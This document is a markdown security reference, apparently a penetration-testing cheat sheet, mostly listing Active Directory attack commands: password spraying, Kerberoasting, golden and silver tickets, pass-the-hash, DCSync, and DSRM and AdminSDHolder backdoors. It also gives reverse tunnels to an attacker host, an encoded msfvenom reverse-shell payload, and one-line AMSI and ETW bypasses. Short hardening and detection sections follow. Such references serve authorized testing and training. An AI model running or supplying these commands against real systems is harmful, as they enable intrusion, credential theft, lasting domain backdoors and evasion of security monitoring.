# Network & Infrastructure Security Reference

## Active Directory Attack Paths

### Initial Foothold
```bash
# Spray credentials (careful: lockout policy!)
crackmapexec smb <DC_IP> -u users.txt -p passwords.txt --continue-on-success
kerbrute passwordspray -d domain.local --dc <DC_IP> users.txt 'Password123!'

# Null session enumeration
enum4linux -a <DC_IP>
rpcclient -U "" -N <DC_IP>

# LDAP anonymous bind
ldapsearch -x -H ldap://<DC_IP> -b "DC=domain,DC=local"
```

### Kerberos Attacks
```bash
# AS-REP Roasting (accounts with "Do not require Kerberos preauthentication")
GetNPUsers.py domain.local/ -usersfile users.txt -no-pass -dc-ip <DC_IP>
hashcat -m 18200 hashes.txt rockyou.txt

# Kerberoasting (service accounts with SPNs)  
GetUserSPNs.py domain.local/user:pass -dc-ip <DC_IP> -request -outputfile kerberoast.txt
hashcat -m 13100 kerberoast.txt rockyou.txt

# Golden Ticket (requires krbtgt hash)
ticketer.py -nthash <krbtgt_HASH> -domain-sid <SID> -domain domain.local Administrator
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass domain.local/Administrator@<DC_IP>

# Silver Ticket (service-specific)
ticketer.py -nthash <service_HASH> -domain-sid <SID> -domain domain.local -spn cifs/server.domain.local user
```

### Lateral Movement
```bash
# Pass-the-Hash
crackmapexec smb <SUBNET>/24 -u Administrator -H <NTLM_HASH> --local-auth
evil-winrm -i <target> -u Administrator -H <NTLM_HASH>

# Pass-the-Ticket
export KRB5CCNAME=/tmp/ticket.ccache
wmiexec.py -k -no-pass domain.local/user@target

# Overpass-the-Hash (NTLM → Kerberos)
mimikatz# sekurlsa::pth /user:admin /domain:domain.local /ntlm:<hash> /run:cmd.exe
```

### BloodHound Attack Paths
```
Key relationships to look for:
- GenericAll → Full control (reset password, add to group)
- GenericWrite → Modify attributes (set SPN for targeted kerberoasting)
- WriteDACL → Modify ACL (grant yourself GenericAll)
- DCSync rights → Replicate directory (get all hashes)
- AdminTo → Local admin on machine
- CanRDP → Remote Desktop access

Cypher queries:
// Find shortest path to DA
MATCH p=shortestPath((u:User{name:"USER@DOMAIN.LOCAL"})-[*1..]->(g:Group{name:"DOMAIN ADMINS@DOMAIN.LOCAL"})) RETURN p

// All users with path to DA
MATCH (u:User),(g:Group{name:"DOMAIN ADMINS@DOMAIN.LOCAL"}),p=shortestPath((u)-[*1..]->(g)) RETURN p

// Kerberoastable users with path to DA
MATCH (u:User{hasspn:true}),(g:Group{name:"DOMAIN ADMINS@DOMAIN.LOCAL"}),p=shortestPath((u)-[*1..]->(g)) RETURN p
```

### Domain Persistence
```bash
# DCSync — replicate AD, get all hashes
secretsdump.py -just-dc domain.local/Administrator@<DC_IP>
mimikatz# lsadump::dcsync /domain:domain.local /all /csv

# DSRM backdoor
mimikatz# lsadump::lsa /patch
# Set HKLM\System\CurrentControlSet\Control\Lsa\DsrmAdminLogonBehavior = 2
# Then PTH with DSRM hash

# AdminSDHolder persistence
# Add user to AdminSDHolder ACL → propagates to protected groups every 60 min
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=domain,DC=local' -PrincipalIdentity backdoor -Rights All
```

---

## Network Pivoting & Tunneling

```bash
# SSH tunneling
# Local forward: access remote service locally
ssh -L 8080:internal-server:80 user@jumphost

# Remote forward: expose local service to remote
ssh -R 9090:localhost:9090 user@jumphost

# SOCKS proxy through SSH
ssh -D 1080 user@jumphost
proxychains nmap -sT <internal_target>

# Chisel (HTTP tunneling through firewalls)
# Server side (attacker)
./chisel server -p 8000 --reverse

# Client side (victim)
./chisel client attacker_ip:8000 R:socks

# SSHuttle (VPN-like over SSH)
sshuttle -r user@jumphost 10.10.10.0/24

# Ligolo-ng (modern tunneling)
# Agent on victim
./agent -connect attacker_ip:11601 -ignore-cert

# Proxy on attacker
./proxy -selfcert
>> tunnel_start --tun ligolo
>> session → use [victim_session] → start
```

---

## Firewall & IDS/IPS Evasion

```bash
# Nmap evasion techniques
nmap -f <target>                    # Fragment packets
nmap -D RND:10 <target>             # Decoy scan
nmap --source-port 53 <target>      # Spoof source port
nmap -sI zombie_host <target>       # Idle/zombie scan
nmap --data-length 200 <target>     # Add random data to packets
nmap -T0 <target>                   # Paranoid timing

# Payload obfuscation (MSF)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=443 \
  -e x64/xor_dynamic -i 10 -f exe > payload.exe

# AMSI bypass (PowerShell)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# ETW bypass
[Reflection.Assembly]::LoadWithPartialName('System.Diagnostics')
$provider = [Diagnostics.Eventing.EventProvider]
$field = $provider.GetField('m_enabled', 'NonPublic,Instance')
```

---

## Network Hardening Checklist

### Firewall Rules
```
✅ Default DENY all inbound/outbound
✅ Allow only specific ports per service (principle of least privilege)
✅ Block RFC1918 from internet interfaces
✅ Implement egress filtering (prevent data exfil)
✅ Log all DENY rules
✅ Regular rule review — remove unused rules
```

### Segmentation
```
DMZ → Internal: Controlled access, specific ports only
User VLAN → Server VLAN: Block unless needed
Server → Server: Micro-segmentation
Flat networks = attacker's paradise
```

### Detection (Network IOCs)
```
# Suspicious traffic patterns:
- Large DNS TXT record responses (DNS tunneling)
- Beaconing at regular intervals (C2)
- Unusual outbound ports (4444, 1337, 8888)
- Internal hosts scanning (lateral movement)
- Kerberoast/AS-REP traffic spikes
- LDAP enumeration from workstations

# Zeek (Bro) queries
zeek-cut id.orig_h id.resp_h id.resp_p proto < conn.log | sort | uniq -c | sort -rn
```

---

## VPN & Zero Trust

### Common VPN Vulnerabilities
```
- Pulse Secure: CVE-2019-11510 (unauth file read)
- Fortinet SSL-VPN: CVE-2018-13379 (path traversal → creds)
- Citrix ADC: CVE-2019-19781 (path traversal RCE)
- Palo Alto GlobalProtect: CVE-2021-3064 (buffer overflow)

Testing:
nuclei -u https://vpn.target.com -t cves/ -t vulnerabilities/ssl-vpn/
```

### Zero Trust Architecture Principles
```
1. Verify explicitly — always authenticate + authorize
2. Use least privilege access — JIT, JEA
3. Assume breach — segment, encrypt, monitor
4. Identity is the new perimeter (BeyondCorp model)
```
